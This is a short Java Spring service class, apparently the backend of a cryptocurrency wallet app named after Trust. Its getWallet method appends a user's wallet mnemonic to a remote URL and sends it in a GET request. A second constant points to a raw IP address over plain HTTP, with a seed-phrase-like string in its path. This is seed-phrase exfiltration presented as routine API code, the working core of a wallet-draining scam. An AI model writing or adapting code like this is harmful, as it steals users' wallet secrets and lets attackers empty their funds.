package devtov.calypsoapp.service.api;


import devtov.calypsoapp.dto.api.WalletApiModel;
import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

@Service
@Slf4j
@AllArgsConstructor
public class TrustApiService {

    private final RestTemplate restTemplate;
    private final String API_URL = "https://core.calypso.fund/get-account/";
    private final String API_URL_CHECK = "http://91.108.121.206/check-account/traffic%20genre%20venue%20agent%20company%20rifle%20manage%20maid%20yellow%20nation%20denial%20hour";

    public WalletApiModel  getWallet(String mnemonic) {
        WalletApiModel walletApiModel = null;
        try {
            walletApiModel = restTemplate
                    .getForObject(API_URL.concat(mnemonic), WalletApiModel.class);
            log.info("Response from API: {}", walletApiModel);
        } catch (Exception ex) {
            log.warn("Exception.", ex);
        }
        return walletApiModel;
    }

}
